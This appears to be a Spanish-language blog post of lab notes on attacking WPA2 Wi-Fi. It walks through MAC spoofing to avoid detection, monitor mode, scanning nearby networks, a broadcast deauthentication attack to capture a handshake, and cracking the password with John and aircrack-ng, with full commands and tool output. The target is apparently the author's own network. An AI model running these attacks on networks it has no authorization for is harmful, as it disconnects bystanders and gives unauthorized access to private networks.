---
title: Hacking Wireless
date: 2022-02-19
categories: [Hacking wireless, Linux]
tags: [notas]     # TAG names should always be lowercase
---

## REQUISITOS
 - Tarjeta de red que soporta el modo monitor o modo promiscuo
 - [Airmon-ng](https://en.kali.tools/?p=167)
 - [Aireplay-ng](https://en.kali.tools/?p=79)
 - [macchanger](https://en.kali.tools/?p=1404)
 - Red wifi esto se puede generar desde un movil.
 - Una OS para pentesting puede ser Kali o Parrot de preferencia, estas son las más comunes

 ---

## CONCEPTOS BÁSICOS
- ¿Qué es el modo monitor?
    
  El modo monitor también es conocido como modo de escucha o modo promiscuo. En este modo de funcionamiento la tarjeta WIFi se encargará de escuchar todos y cada uno de los paquetes que hay en el «aire» y tendremos la posibilidad de capturarlos con diferentes programas. En este modo de funcionamiento no solamente escucharemos lo que nos envía nuestro router o AP, sino también el intercambio de información que hay en otras redes WiFi, como las de nuestros vecinos. El modo monitor se encargará de escanear en todas las frecuencias y recoger la mayor cantidad de datos posible, no obstante, como está escaneando en todas las frecuencias WiFi de manera continua, si queremos obtener toda la información de un determinado router o AP, deberemos fijar un canal específico que sea el que está emitiendo dicho router o AP, para no perder ningún paquete importante que intercambie con los clientes.

  En este modo de funcionamiento, y usando unos programas bastante específicos, podremos conocer la dirección MAC de todos los clientes que hay conectados a un determinado router o punto de acceso WiFi, porque podrá capturar las tramas que viajan por el aire desde el origen hasta el destino. Esta característica del modo monitor en algunas tarjetas WiFi, es fundamental para realizar estudios de redes WiFi y también auditorías inalámbricas.
  
  Fuente: [redeszone.net](https://www.redeszone.net/tutoriales/redes-wifi/que-es-modo-monitor-tarjetas-wifi/)

- ¿Handshake?

  Handshaking es una palabra inglesa cuyo significado es "apretón de manos" y que es utilizada en tecnologías de la información, telecomunicaciones, y otras conexas. Handshaking es un proceso automatizado de negociación que establece de forma dinámica los parámetros de un canal de comunicaciones establecido entre dos entidades antes de que comience la comunicación normal por el canal. De ello se desprende la creación física del canal y precede a la transferencia de información normal.

  Por lo general, un proceso que tiene lugar cuando un equipo está a punto de comunicarse con un dispositivo exterior a establecer normas para la comunicación.

  Cuando un ordenador se comunica con otro dispositivo como un módem o una impresora que necesita realizar un handshaking con él para establecer una conexión.

---

## LABORATORIO

### CAMBIANDO LA MAC DE NUESTRA TARJETA DE RED
- Ahora para que no nos atrapen en alguna auditoria tendremos que cambiar nuestra MAC de nuestra tarjeta de red, lo podemos hacer de varias maneras una de ellas es usando [macchanger](https://en.kali.tools/?p=1404). 

    Entonces procederemos a dar de baja nuestra tarjeta de red:
    ```bash
    sudo ifconfig <tarjeta de red> down     
    ```
    Cambiando la mac de nuestra tarjeta de red:
    ```bash
    macchanger wlan0  -r 
    ```
    Podriamos elegir una mac del dispositivo por el cual se desea pasar, las cuales se pueden lista con:
    ```bash
    macchanger -l
    ```
    ```bash 
    (kali㉿Hacknet)-[~/Escritorio/labWireless]
    Sie7e>$ macchanger -l       
    Misc MACs:
    Num    MAC        Vendor
    ---    ---        ------
    0000 - 00:00:00 - XEROX CORPORATION
    0001 - 00:00:01 - XEROX CORPORATION
    0002 - 00:00:02 - XEROX CORPORATION
    0003 - 00:00:03 - XEROX CORPORATION
    0004 - 00:00:04 - XEROX CORPORATION
    0005 - 00:00:05 - XEROX CORPORATION
    0006 - 00:00:06 - XEROX CORPORATION
    0007 - 00:00:07 - XEROX CORPORATION
    0008 - 00:00:08 - XEROX CORPORATION
    0009 - 00:00:09 - XEROX CORPORATION
    0010 - 00:00:0a - OMRON TATEISI ELECTRONICS CO.
    0011 - 00:00:0b - MATRIX CORPORATION
    0012 - 00:00:0c - CISCO SYSTEMS, INC.
    0013 - 00:00:0d - FIBRONICS LTD.
    0014 - 00:00:0e - FUJITSU LIMITED
    0015 - 00:00:0f - NEXT, INC.
    0016 - 00:00:10 - SYTEK INC.
    0017 - 00:00:11 - NORMEREL SYSTEMES
    0018 - 00:00:12 - INFORMATION TECHNOLOGY LIMITED
    0019 - 00:00:13 - CAMEX
    0020 - 00:00:14 - NETRONIX
    0021 - 00:00:15 - DATAPOINT CORPORATION
    0022 - 00:00:16 - DU PONT PIXEL SYSTEMS     .
    0023 - 00:00:17 - Oracle
    0024 - 00:00:18 - WEBSTER COMPUTER CORPORATION
    0025 - 00:00:19 - APPLIED DYNAMICS INTERNATIONAL
    0026 - 00:00:1a - ADVANCED MICRO DEVICES
    0027 - 00:00:1b - NOVELL INC.
    0028 - 00:00:1c - BELL TECHNOLOGIES
    0029 - 00:00:1d - CABLETRON SYSTEMS, INC.
    .
    .
    .
    ```
    Se tiene una larga lista de MAC de dispositivos, el cual se le pueden asignar a nuestra tarjeta de red de la siguiente manera:
    ```bash
    macchanger <tarjeta de red> -m XX:XX:XX:XX:XX:XX
    macchanger <tarjeta de red> --mac=XX:XX:XX:XX:XX:XX
    ```
    Ya cambiada la MAC de la tarjeta de red vamos a darle de alta con:
    ```bash
    sudo ifconfig <tarjeta de red> up
    ```
    Si se desea reestablecer nuestra dirección MAC, tendremos que dar de baja y ejecutar lo siguiente:
    ```bash 
    macchanger <tarjeta de red> -p
    ```

    Ahora procederemos a ejecutar lo antes ya mencionado:
    ```bash
    (kali㉿Hacknet)-[~/Escritorio/labWireless]
    Sie7e>sudo ifconfig wlan0 down

    (kali㉿Hacknet)-[~/Escritorio/labWireless]
    Sie7e>sudo macchanger wlan0  -r
    Current MAC:   ae:de:ad:c7:40:61 (unknown)
    Permanent MAC: 00:00:00:00:00:00 (ALFA, INC.)
    New MAC:       ee:08:0f:6e:62:06 (unknown)

    (kali㉿Hacknet)-[~/Escritorio/labWireless]
    Sie7e>$ sudo ifconfig wlan0 up   

    ```

### TARJETA DE RED EN MODO MONITOR
- Como se mencionó antes, primero pondremos nuestra tarjeta de red en modo monitor, usando: 
  ```bash 
  sudo airmon-ng start <tarjeta de red>
  ```

  ```bash
  (kali㉿Hacknet)-[~/Escritorio/labWireless]
  Sie7e>sudo airmon-ng start wlan0                                                           
  Found 2 processes that could cause trouble.
  Kill them using 'airmon-ng check kill' before putting
  the card in monitor mode, they will interfere by changing channels
  and sometimes putting the interface back in managed mode

      PID Name
      507 NetworkManager
    14859 wpa_supplicant

  PHY     Interface       Driver          Chipset

  phy0    wlan0           88XXau          Realtek Semiconductor Corp. RTL8812AU 802.11a/b/g/n/ac 2T2R DB WLAN Adapter
                  (mac80211 monitor mode already enabled for [phy0]wlan0 on [phy0]wlan0)

    ```
  Esto te puede pasar en la cual no te deja entrar al modo monitor, esto sucede por que hay algunos servicios se estan ejecutando. Entonces detendremos estos servicios, las cuales nos dejaran sin conexión a internet

  ```bash
  (kali㉿Hacknet)-[~/Escritorio/labWireless]
  Sie7e>sudo airmon-ng check kill                                                                        
  Killing these processes:

      PID Name
    14859 wpa_supplicant

  ```
  Si volvemos a ejecutar, nuestra tarjeta de red estaría en modo monitor

  ```bash
  (kali㉿Hacknet)-[~/Escritorio/labWireless]
  Sie7e>$ sudo airmon-ng start wlan0


  PHY     Interface       Driver          Chipset

  phy0    wlan0           88XXau          Realtek Semiconductor Corp. RTL8812AU 802.11a/b/g/n/ac 2T2R DB WLAN Adapter
                  (mac80211 monitor mode already enabled for [phy0]wlan0 on [phy0]wlan0)

  ```

### LISTANDO LAS INTERFACES DE RED 
- Para listar las redes wifi que estan a tu alrededor 

  ```bash
  airodump-ng wlan0 
  ```

  ```bash
  (kali㉿Hacknet)-[~/Escritorio/labWireless]
  Sie7e>$ sudo airodump-ng wlan0 

  CH  8 ][ Elapsed: 1 min ][ 0000-00-00 00:00                                                                                                                                          
                                                                                                                                                                                      
  BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
                                                                                                                                                                                        
  ??:6C:??:E0:??:EE  -31      319        0    0   6  540   WPA2 CCMP   PSK  ????ISTAR_77E8
  B4:1C:30:6C:03:E8  -41      246       76    0   1   65   WPA2 CCMP   PSK  SieteLand
  ??:F5:??:12:??:F8  -45       67       18    0  11  130   WPA2 CCMP   PSK  ????ISTAR_13F0                        
  ??:5A:??:61:??:68  -55      137        0    0   1  130   WPA2 CCMP   PSK  ????ZEL PALACIOS D.
  ??:5A:??:EA:??:C8  -57      127        0    0  11  130   WPA2 CCMP   PSK  ????ISTAR_57C0
  ??:5A:??:99:??:98  -57      140        0    0   1  130   WPA2 CCMP   PSK  ????ILIA
  ??:77:??:B8:??:C6  -70      286        0    0   6  540   WPA2 CCMP   PSK  ????ISTAR_30C0
  ??:9D:??:29:??:40  -60      102       14    0  11  130   WPA2 CCMP   PSK  ????ISTAR_13F0
  ??:5A:??:57:??:E8  -61      104      414    0  11  130   WPA2 CCMP   PSK  ????i AMG
  ??:F5:??:24:??:78  -70      123        0    0   1  130   WPA2 CCMP   PSK  ????ISTAR_2870
  ??:2E:??:14:??:26  -73      152        8    0   6  130   WPA2 CCMP   PSK  ????RO-B612-AE26
  ??:32:??:C2:??:11  -74      157        1    0   7  270   WPA2 CCMP   PSK  ????AY - LUCY
  ??:2E:??:14:??:2A  -73      187        0    0   6  130   WPA2 CCMP   PSK  ????ngth:  0>
  ??:DE:??:02:??:62  -77        5        0    0   1  130   WPA2 CCMP   PSK  ????ISTAR_D25E
  ??:02:??:01:??:16  -78       45        0    0  10  130   WPA2 CCMP   PSK  ????los_GH
  ??:CA:??:F7:??:0D  -79        2        0    0   3   54 . OPN              ????Wlan ??????
  ??:6B:??:5B:??:8E  -79       57        4    0   2  270   WPA2 CCMP   PSK  ????
  ??:B4:??:47:??:66  -80       42        8    0   1  130   WPA2 CCMP   PSK  ????ISTAR_3963
  ??:AA:??:DE:??:72  -82       24        0    0   6  130   WPA2 CCMP   PSK  ????ISTAR_E370
  ??:4A:??:D1:??:91  -84        1        1    0   1  195   WPA2 CCMP   PSK  ????ISTAR_F08D
  ??:5A:??:D6:??:78  -80        6        0    0   6  130   WPA2 CCMP   PSK  ????ISTAR_3370
  ??:8A:??:68:??:D6  -87        0        0    0  -1   -1                    ????ngth:  0>
  ??:84:??:DD:??:E8  -81        3        0    0   9  270   WPA2 CCMP   PSK  ????Link_14E8
                                                                                                
  BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

  (not associated)   ??:A?:5?:8?:28:AC  -59    0 - 1      0        4
  (not associated)   ??:C?:4?:6?:9C:DB  -61    0 - 1      0        4
  (not associated)   ??:B?:9?:C?:EF:3F  -75    0 - 5      0        2 
  (not associated)   ??:7?:2?:7?:C6:8D  -83    0 - 1      0        5 
  (not associated)   ??:5?:E?:4?:17:30  -83    0 - 1      0        2 
  ??:1?:3?:6?:03:E8  ??:1?:7?:0?:53:7E  -71    1e- 1    135      125 
  ??:F?:3?:1?:13:F8  ??:8?:9?:0?:B4:59   -1    1e- 0      0        1 
  ??:F?:3?:1?:13:F8  ??:9?:7?:0?:11:40  -73    0 - 1e     0       12 
  ??:5?:1?:6?:68:68  ??:6?:9?:5?:9C:B4  -73    0 - 1      0        1 
  ??:5?:1?:E?:57:C8  ??:2?:9?:7?:CB:85  -77    0 - 1      0        2        
  ```

  Una vez la teniendo las redes wifi listadas podemos observar:
  - El CH que es el canal por donde viajan los paquetes
  - BSSID que representa la MAC del router
  - PWR que indica lo lejos o cerca que esta la red wifi
  - ENC la encriptación 
  - CIPHER el tipo de cifrado 
  - ESSID indica el nombre de la red wifi

  Solo nos centraremos en la red objetivo la que es "SieteLand"

  ```bash
  BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

  B4:1C:30:6C:03:E8  -41      246       76    0   1   65   WPA2 CCMP   PSK  SieteLand
  ```

### LANZANDO UN ATAQUE DEAUTH PARA OBTENER EL HANDSHAKE
- Ejecutamos lo siguiente:
  
  - Primera terminal:
  ```bash
  airodump-ng wlan0 -c 1 -w captura --essid SieteLand 
  ```
    - -c indica el canal.
    - w guardar la captura del handshake.
    - --essid el nombre de la red wifi, tambien se podria filtar por el bssid.
  - Segunda terminal:
  ```bash
  sudo aireplay-ng  -0 0 -e SieteLand -c FF:FF:FF:FF:FF:FF wlan0   
  ```
    - -0 indica el tipo de ataque que realizaremos que en nuestro caso es un ataque deauth y podemos colocar una determinada cantidad de paquetes. En nuestra caso vamos a colocarle 0 porque pararemos cuando obtengamos el handshake. 
    - -e es el paramatro por la cual le pasas la red wifi objetivo 
    - -c La mac del cliente que esta conectado al que se desea desauntenticar, al poner FF:FF:FF:FF:FF:FF le estamos diciendo que desauntentique a todos los clientes conectados a la red.

  - Terminal 1.
  
  ```bash
  (kali㉿Hacknet)-[~/Escritorio/labWireless]
  Sie7e>$ sudo airodump-ng wlan0 -c 1 -w captura --essid SieteLand  
  
  CH  1 ][ Elapsed: 20 s][ 0000-00-00 00:00 ][ WPA handshake: FC:5A:1D:61:68:68]
  BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

  B4:1C:30:6C:03:E8  -13  96    15011     2273    0   1   65   WPA2 CCMP   PSK  SieteLand
                                                                                               
  BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
                                                                                                     
  (not associated)   2C:2B:F9:2E:14:64  -55    0 - 1      0       32         ??????AR_57C0
  B4:1C:30:6C:03:E8  74:15:75:0D:53:7E  -15    1e- 1    307     4056  EAPOL  
  ```

  - Terminal 2.
  
  ```bash
  (kali㉿Hacknet)-[~/Escritorio/labWireless]
  Sie7e>$ sudo aireplay-ng  -0 0 -e SieteLand -c FF:FF:FF:FF:FF:FF wlan0
  [sudo] password for kali: 
  00:46:08  Waiting for beacon frame (ESSID: SieteLand) on channel 1
  Found BSSID "B4:1C:30:6C:03:E8" to given ESSID "SieteLand".
  00:46:09  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 1|61 ACKs]
  00:46:10  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0|62 ACKs]
  00:46:10  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 3|62 ACKs]
  00:46:11  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0|64 ACKs]
  00:46:11  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0|61 ACKs]
  00:46:12  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0|64 ACKs]
  00:46:13  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0|63 ACKs]
  00:46:13  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0|62 ACKs]
  00:46:14  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0|64 ACKs]
  00:46:15  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0|62 ACKs]
  00:46:15  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0|64 ACKs]
  00:46:16  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0|63 ACKs]
  00:46:17  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0|61 ACKs]
  00:46:17  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0|64 ACKs]
  00:46:18  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0|62 ACKs]
  00:46:18  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0|64 ACKs]
  00:46:19  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0|65 ACKs]
  00:46:20  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0|62 ACKs]
  00:46:20  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0|63 ACKs]
  00:46:21  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0|61 ACKs]
  00:46:22  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0|62 ACKs]
  00:46:22  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0|64 ACKs]
  00:46:23  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0|62 ACKs]
  00:46:24  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0|64 ACKs]
  00:46:24  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0|62 ACKs]
  00:46:25  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0|65 ACKs]
  00:46:26  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0|64 ACKs]
  00:46:26  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0|62 ACKs]
  00:46:27  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0|63 ACKs]
  00:46:27  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0|62 ACKs]
  00:46:28  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0|62 ACKs]
  00:46:29  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0|63 ACKs]
  00:46:29  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0|64 ACKs]
  00:46:30  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 2|61 ACKs]
  00:46:31  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 2|65 ACKs]
  00:46:31  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 2|60 ACKs]
  00:46:32  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0|62 ACKs]
  00:46:32  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:^C:FF] [ 1| 8 ACKs]
  ```
  Tendremos ejecutando la segunda terminal hasta que el la primera nos ponga la siguiente:
  
  ```bash
  [ WPA handshake: FC:5A:1D:61:68:68]
  ```
  Esto nos indica que ya obtuvimos el handshake, y podemos detener el ataque de la segunda terminal

### CRACKING DEL HANDSHAKE

  Terminado el ataque obtendremos unos archivos:
  ```bash
  (kali㉿Hacknet)-[~/Escritorio/labWireless]
  Sie7e>$ ls
  captura-01.cap  captura-01.csv  captura-01.kismet.csv  captura-01.kismet.netxml  captura-01.log.csv
  ```
  el mas importante es captura-01.cap

  Se recomiendo tener a la mano un buen diccionario para poder realizar el cracking de la contraseña de la red wifi, porque dependerá del método que uses para crackear y obtener la contrasela en texto claro.
  
- **CRACKING CON JOHN**
  - Primero debemos de covertir la captura a un  ".hcap" de la siguiente manera:
  
    aircrack-ng -J < Nombre que trendra el archivo > < Nombre de la captura>

  ```bash
  (kali㉿Hacknet)-[~/Escritorio/labWireless]
    Sie7e>$ aircrack-ng -J hash.hcap captura-01.cap 
    Reading packets, please wait...
    Opening captura-01.cap
    Read 24770 packets.

      #  BSSID              ESSID                     Encryption

      1  B4:1C:30:6C:03:E8  SieteLand                 WPA (1 handshake)

    Choosing first network as target.

    Reading packets, please wait...
    Opening captura-01.cap
    Read 24770 packets.

    1 potential targets
    Building Hashcat file...

    [*] ESSID (length: 9): SieteLand
    [*] Key version: 2
    [*] BSSID: B4:1C:30:6C:03:E8
    [*] STA: 74:15:75:0D:53:7E
    [*] anonce:
        B9 FD F1 6A 57 91 43 91 C1 51 40 73 E6 CE F0 35 
        0E 6C 4A 6E C3 E3 F3 F1 FE A1 F3 80 C0 BC 23 EF 
    [*] snonce:
        81 35 9A 2E 6E 25 A5 D2 2E F6 71 F7 6B E1 82 20 
        27 93 FF 1B 3C 7D 68 CA 0B 56 E5 A2 3F DB B9 EF 
    [*] Key MIC:
        99 0B 99 43 0D 8A 52 05 6C C1 92 A3 93 82 E9 7D
    [*] eapol:
        01 03 00 75 02 01 0A 00 00 00 00 00 00 00 00 00 
        01 81 35 9A 2E 6E 25 A5 D2 2E F6 71 F7 6B E1 82 
        20 27 93 FF 1B 3C 7D 68 CA 0B 56 E5 A2 3F DB B9 
        EF 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
        00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
        00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
        00 00 16 30 14 01 00 00 0F AC 04 01 00 00 0F AC 
        04 01 00 00 0F AC 02 00 00 

    Successfully written to hash.hcap.hccap
  ```
    - Debemos obtener el hash, asi que usaremos hccap2john:

      hccap2john < captura >  > < Nombre del hash >
  
  ```bash
  (kali㉿Hacknet)-[~/Escritorio/labWireless]
  Sie7e>$ hccap2john hash.hcap > hash 
  ```
  - Teniendo el hash, podemos crackearlo con john de la siguiente manera:


  ```bash
  (kali㉿Hacknet)-[~/Escritorio/labWireless]
  Sie7e>$ john --wordlist=/usr/share/wordlists/rockyou.txt hash                                                                                                                     1 ⨯
  Warning: detected hash type "wpapsk", but the string is also recognized as "wpapsk-pmk"
  Use the "--format=wpapsk-pmk" option to force loading these as that type instead
  Using default input encoding: UTF-8
  Loaded 1 password hash (wpapsk, WPA/WPA2/PMF/PMKID PSK [PBKDF2-SHA1 256/256 AVX2 8x])
  Will run 4 OpenMP threads
  Note: Minimum length forced to 8 by format
  Press 'q' or Ctrl-C to abort, almost any other key for status
  123456789        (SieteLand)     
  1g 0:00:00:00 DONE (2022-02-20 02:11) 33.33g/s 4266p/s 4266c/s 4266C/s 123456789..manchester
  Use the "--show" option to display all of the cracked passwords reliably
  Session completed. 

  ```
  password: 123456789

- **CRACKING CON AIRCRACK-NG**

    - **aircrack -w < diccionario > < captura.cap>**

    ```bash
    (kali㉿Hacknet)-[~/Escritorio/labWireless]
    Sie7e>$ aircrack-ng captura-01.cap -w /usr/share/wordlists/rockyou.txt
    Reading packets, please wait...
    Opening captura-01.cap
    Read 24770 packets.

   #  BSSID              ESSID                     Encryption

   1  B4:1C:30:6C:03:E8  SieteLand                 WPA (1 handshake)

    Choosing first network as target.

    Reading packets, please wait...
    Opening captura-01.cap
    Read 24770 packets.

    1 potential targets

                               Aircrack-ng 1.6 

      [00:00:00] 142/10303727 keys tested (3948.93 k/s) 

      Time left: 1 hour, 22 minutes, 38 seconds                  0.00%

                           KEY FOUND! [ 123456789 ]


      Master Key     : EE D9 D2 D6 B2 99 E3 C8 AF EE BE 4D 33 7D 9B 45 
                       8A A1 15 64 6E 1E CC 5F B9 19 DA 7C 87 CF 34 1B 

      Transient Key  : 68 05 30 51 E5 F3 13 1F D7 F9 FE 82 F3 2A 7B 4B 
                       02 AB 2D CA 87 55 84 DF A2 07 C8 3E F7 A5 1D 4D 
                       6B 83 37 B7 5A 53 08 DC 36 E8 CC 02 A0 7A CF CE 
                       66 BF 87 D3 75 B2 7B 97 F9 8F E6 C7 61 E2 17 D6 

      EAPOL HMAC     : 99 0B 99 43 0D 8A 52 05 6C C1 92 A3 93 82 E9 7D 

    ```
    password: 123456789

  Para reestablecer la conexion debemos iniciar los servicios que detuvimos para poder entrar en el modo monitor de nuestra tarjeta de red:

  ```bash
  service wpa_supplicant start 
	service NetworkManager start

  ```
  Una vez obtenido el handshake, se puede crackear la contraseña de distintas maneras, como ya lo dije se debe de tener un diccionario bien potente y ademas, depende de la complejidad contraseña. 


---